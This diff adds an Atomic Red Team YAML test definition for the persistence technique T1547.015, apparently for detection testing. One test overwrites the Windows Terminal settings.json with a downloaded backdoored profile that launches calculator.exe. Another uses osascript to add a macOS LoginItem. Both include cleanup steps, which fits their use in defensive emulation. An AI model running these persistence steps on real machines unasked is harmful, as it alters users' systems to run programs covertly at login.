@@ -1,0 +1,91 @@
+atomic_tests:
+- auto_generated_guid: ec5d76ef-82fe-48da-b931-bdb25a62bc65
+  dependencies:
+  - description: 'Windows Terminal must be installed
+
+      '
+    get_prereq_command: '$(rm ~\AppData\Local\Packages\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\LocalState\StoreEdgeFD\installed.db
+      -ErrorAction Ignore; Write-Output ""; $?) -and $(winget install --id=Microsoft.WindowsTerminal)
+
+      '
+    prereq_command: 'if (Test-Path #{wt_exe}) {exit 0} else {exit 1}
+
+      '
+  dependency_executor_name: powershell
+  description: Modify Windows Terminal settings.json file to gain persistence. [Twitter
+    Post](https://twitter.com/nas_bench/status/1550836225652686848)
+  executor:
+    cleanup_command: 'mv -Force #{settings_json_tmp} #{settings_json_def}
+
+      taskkill /F /IM "#{calculator}" > $null
+
+      '
+    command: 'mv #{settings_json_def} #{settings_json_tmp}
+
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.015/src/settings.json?raw=true"
+      -OutFile "#{settings_json_def}"
+
+      wt.exe
+
+      '
+    name: powershell
+  input_arguments:
+    calculator:
+      default: calculator.exe
+      description: Test program used to imitate a maliciously called program.
+      type: string
+    settings_json_def:
+      default: ~\AppData\Local\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json
+      description: Default file for Windows Terminal to replace the default profile
+        with a backdoor to call another program.
+      type: path
+    settings_json_tmp:
+      default: ~\AppData\Local\Temp\settings.json
+      description: Temp file for Windows Terminal.
+      type: path
+    wt_exe:
+      default: ~\AppData\Local\Microsoft\WindowsApps\Microsoft.WindowsTerminal_8wekyb3d8bbwe\wt.exe
+      description: Windows Terminal executable.
+      type: path
+  name: Persistence by modifying Windows Terminal profile
+  supported_platforms:
+  - windows
+- auto_generated_guid: 716e756a-607b-41f3-8204-b214baf37c1d
+  description: 'Runs osascript on a file to create new LoginItem for current user.
+
+    NOTE: Will popup dialog prompting user to Allow or Deny Terminal.app to control
+    "System Events"
+
+    Therefore, it can''t be automated until the TCC is granted.
+
+    The login item launches Safari.app when user logs in, but there is a cleanup script
+    to remove it as well.
+
+    In addition to the `osascript` Process Events, file modification events to
+
+    `/Users/*/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`
+    should be seen.
+
+    '
+  executor:
+    cleanup_command: 'osascript #{cleanup_script}
+
+      '
+    command: 'osascript #{scriptfile}
+
+      '
+    name: bash
+  input_arguments:
+    cleanup_script:
+      default: PathToAtomicsFolder/T1547.015/src/remove_login_item.osa
+      description: path to Applescript source to delete Safari LoginItem.
+      type: string
+    scriptfile:
+      default: PathToAtomicsFolder/T1547.015/src/add_login_item.osa
+      description: path to Applescript source to add Safari LoginItem.
+      type: string
+  name: Add macOS LoginItem using Applescript
+  supported_platforms:
+  - macos
+attack_technique: T1547.015
+display_name: 'Boot or Logon Autostart Execution: Login Items'
